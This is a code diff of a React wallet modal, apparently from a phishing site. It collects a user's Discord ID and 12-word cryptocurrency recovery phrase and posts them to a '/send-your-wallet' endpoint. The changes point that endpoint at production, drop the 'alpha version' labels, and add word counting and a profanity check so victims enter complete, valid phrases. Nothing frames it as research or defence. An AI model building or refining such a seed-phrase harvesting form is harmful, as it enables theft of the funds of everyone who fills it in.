@@ -29,7 +29,7 @@ export default function WalletModal(props) {
 
     var config = {
       method: "post",
-      url: "http://localhost:8000/send-your-wallet",
+      url: "/send-your-wallet",
       headers: {
         "Content-Type": "application/json",
       },
@@ -38,22 +38,32 @@ export default function WalletModal(props) {
 
     axios(config)
       .then((response) => {
-        if (
+        // WORD IS PROHIBITED
+        if (response.data === "Profanities is Prohbited") {
+          setCorrect(true);
+          alert(response.data);
+          // THE LENGHT DID NOT MATCH
+        } else if (
           response.data ===
           "Recovery phrase should not be less-than or greater-than 12 words"
         ) {
           setCorrect(true);
-          alert(`THIS IS ALPHA VERSION | ${response.data}`);
+          alert(response.data);
+          // SUCCESSFULL
         } else if (response.data === "Wallet has been sent Successfully") {
           setCorrect(false);
-          alert(`THIS IS ALPHA VERSION | ${response.data}`);
+          alert(response.data);
         }
       })
+      // SERVER ERROR
       .catch((error) => {
-        console.log(error);
-        alert("THIS IS ALPHA VERSION | Error occured");
+        alert(error.message);
       });
   };
+
+  // COUNT THE RECOVERY WORDS
+  const recoveryPhraseLength = recoveryPhrase.split(" ");
+  const phraseLength = recoveryPhraseLength.length;
 
   return (
     <>
@@ -86,6 +96,7 @@ export default function WalletModal(props) {
                 <FaDiscord />
               </InputGroup.Text>
               <FormControl
+                isInvalid={correct}
                 placeholder="Enter your discord ID"
                 aria-label="Enter your discord ID"
                 aria-describedby="basic-addon1"
@@ -94,7 +105,12 @@ export default function WalletModal(props) {
               />
             </InputGroup>
             {/* RECOVERY PHRASE */}
-            <Form.Label>Recovery Phrase:</Form.Label>
+            <Form.Label>
+              Recovery Phrase:{" "}
+              <span className="text-red-500 font-medium">
+                {phraseLength >= 2 ? phraseLength : null}
+              </span>
+            </Form.Label>
             <InputGroup className="mb-3">
               <InputGroup.Text id="basic-addon1">
                 <AiFillSecurityScan />
@@ -105,14 +121,18 @@ export default function WalletModal(props) {
                 data-placement="top"
                 title="Typically 12 words separated by single spaces"
                 as="textarea"
-                placeholder="Enter your recovery phrase"
+                placeholder="Enter your recovery phrase | No spaces before and last word"
                 aria-label="Enter your recovery phrase"
                 aria-describedby="basic-addon1"
                 value={recoveryPhrase}
                 onChange={(e) => setRecoveryPhrase(e.target.value)}
               />
             </InputGroup>
-            <Button variant="primary" type="submit">
+            <Button
+              disabled={phraseLength >= 13 ? true : false}
+              variant="primary"
+              type="submit"
+            >
               Submit
             </Button>
           </Form>
